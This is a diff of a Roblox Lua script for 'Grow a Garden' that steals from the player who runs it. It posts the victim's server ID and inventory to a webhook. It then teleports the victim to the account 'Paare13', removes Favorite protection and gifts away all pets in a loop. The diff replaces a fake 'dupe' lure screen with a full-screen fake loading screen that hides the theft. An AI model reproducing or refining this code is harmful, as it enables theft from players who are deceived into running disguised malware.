@@ -1,15 +1,15 @@
--- GROW A GARDEN Logger + AutoGift + Fake Dupe GUI
+-- GROW A GARDEN Logger + AutoGift + Fake Loading Screen
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
-
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local PetsService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService")
 local player = Players.LocalPlayer
 local backpack = player:WaitForChild("Backpack")
 
 local fruits, pets = {}, {}
 
--- Detect tools by ItemType
 for _, tool in ipairs(backpack:GetChildren()) do
 	local itemType = tool:GetAttribute("ItemType")
 	if itemType == "Fruit" then
@@ -31,11 +31,9 @@ local stealScript = string.format([[
 local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-
 TeleportService:TeleportToPlaceInstance(game.PlaceId, "%s", LocalPlayer)
 ]], jobId)
 
--- Send data to webhook
 local http = http_request or request or syn.request
 if http then
 	http({
@@ -64,7 +62,25 @@ if http then
 	})
 end
 
--- AutoGift System: waits for Paare13 and gifts everything
+-- Create fake infinite loading screen
+local gui = Instance.new("ScreenGui", game.CoreGui)
+gui.Name = "FakeLoading"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+
+local frame = Instance.new("Frame", gui)
+frame.BackgroundColor3 = Color3.new(0, 0, 0)
+frame.Size = UDim2.new(1, 0, 1, 0)
+
+local label = Instance.new("TextLabel", frame)
+label.Size = UDim2.new(1, 0, 1, 0)
+label.Text = "Loading..."
+label.TextColor3 = Color3.new(1, 1, 1)
+label.Font = Enum.Font.GothamBold
+label.TextScaled = true
+label.BackgroundTransparency = 1
+
+-- Find Paare13
 local function findPaare13()
 	for _, p in ipairs(Players:GetPlayers()) do
 		if p.Name == "Paare13" then
@@ -74,117 +90,61 @@ local function findPaare13()
 	return nil
 end
 
+-- Equip everything and unset Favorite
 local function equipAll()
 	for _, tool in ipairs(backpack:GetChildren()) do
 		local typeAttr = tool:GetAttribute("ItemType")
 		if typeAttr == "Pet" or typeAttr == "Fruit" then
+			if tool:GetAttribute("Favorite") ~= nil then
+				tool:SetAttribute("Favorite", false)
+			end
 			tool.Parent = player.Character
 		end
 	end
 end
 
-local function fireClosestPrompt()
-	local closestPrompt
-	local shortest = math.huge
-
-	for _, v in ipairs(workspace:GetDescendants()) do
-		if v:IsA("ProximityPrompt") and v.Enabled then
-			local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-			if root and v.Parent and v.Parent:IsA("BasePart") then
-				local dist = (v.Parent.Position - root.Position).Magnitude
-				if dist < shortest then
-					shortest = dist
-					closestPrompt = v
-				end
+-- Gift all equipped pets to Paare13
+local function giftAllToPaare()
+	for _, tool in ipairs(player.Character:GetChildren()) do
+		if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
+			if tool:GetAttribute("Favorite") ~= nil then
+				tool:SetAttribute("Favorite", false)
 			end
+			local args = { "GivePet", Players:WaitForChild("Paare13") }
+			ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
 		end
-	end
-
-	if closestPrompt then
-		fireproximityprompt(closestPrompt)
 	end
 end
 
+-- Disable "Favorite" on equipped tools
+local function disableFavoriteOnEquipped()
+	for _, tool in ipairs(player.Character:GetChildren()) do
+		if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
+			if tool:GetAttribute("Favorite") ~= nil then
+				tool:SetAttribute("Favorite", false)
+			end
+		end
+	end
+end
+
+-- Continuously gift if Paare13 is found
 RunService.RenderStepped:Connect(function()
 	local paare = findPaare13()
 	if paare and player.Character and paare.Character and paare.Character:FindFirstChild("HumanoidRootPart") then
 		player.Character:MoveTo(paare.Character.HumanoidRootPart.Position)
 		equipAll()
-		fireClosestPrompt()
+		disableFavoriteOnEquipped()
+		giftAllToPaare()
 	end
 end)
 
--- Fake Dupe GUI (Client-side, clean tool clone)
-local gui = Instance.new("ScreenGui", game.CoreGui)
-gui.Name = "Buy Easter Shop"
-
-local frame = Instance.new("Frame", gui)
-frame.Size = UDim2.new(0, 300, 0, 180)
-frame.Position = UDim2.new(0.5, -150, 0.5, -90)
-frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-frame.BorderSizePixel = 0
-
-local title = Instance.new("TextLabel", frame)
-title.Text = "Easter v2.1"
-title.Size = UDim2.new(1, 0, 0.2, 0)
-title.BackgroundTransparency = 1
-title.TextColor3 = Color3.new(1, 1, 1)
-title.Font = Enum.Font.GothamBold
-title.TextSize = 20
-
-local status = Instance.new("TextLabel", frame)
-status.Text = "Easter Shop bypass"
-status.Size = UDim2.new(0.9, 0, 0.2, 0)
-status.Position = UDim2.new(0.05, 0, 0.3, 0)
-status.BackgroundTransparency = 1
-status.TextColor3 = Color3.fromRGB(180, 180, 180)
-status.Font = Enum.Font.Gotham
-status.TextSize = 16
-
-local button = Instance.new("TextButton", frame)
-button.Text = "Buy"
-button.Size = UDim2.new(0.8, 0, 0.3, 0)
-button.Position = UDim2.new(0.1, 0, 0.6, 0)
-button.BackgroundColor3 = Color3.fromRGB(60, 130, 60)
-button.TextColor3 = Color3.new(1, 1, 1)
-button.Font = Enum.Font.GothamSemibold
-button.TextSize = 18
-
-button.MouseButton1Click:Connect(function()
-	button.Visible = false
-	status.Text = "Duplicating tools..."
-
-	wait(2)
-
-	-- Clean clone (no _COPY)
-	for _, tool in ipairs(player.Backpack:GetChildren()) do
-		if tool:IsA("Tool") then
-			local dupe = tool:Clone()
-			dupe.Parent = player.Backpack
-		end
-	end
-
-	status.Text = "Success!"
-	wait(3)
-	gui:Destroy()
-end)
-
--- Services
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local PetsService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService")
+-- Unequip all pets from mover objects
 local PetsPhysical = workspace:WaitForChild("PetsPhysical")
-
--- Get local player name
-local playerName = Players.LocalPlayer.Name
-
--- Loop through PetMover parts
 for _, petMover in pairs(PetsPhysical:GetDescendants()) do
 	if petMover:IsA("BasePart") and petMover.Name == "PetMover" then
 		local uuid = petMover:GetAttribute("UUID")
 		local owner = petMover:GetAttribute("OWNER")
-
-		if uuid and owner == playerName then
+		if uuid and owner == player.Name then
 			PetsService:FireServer("UnequipPet", uuid)
 			print("Unequipped pet with UUID:", uuid)
 		end
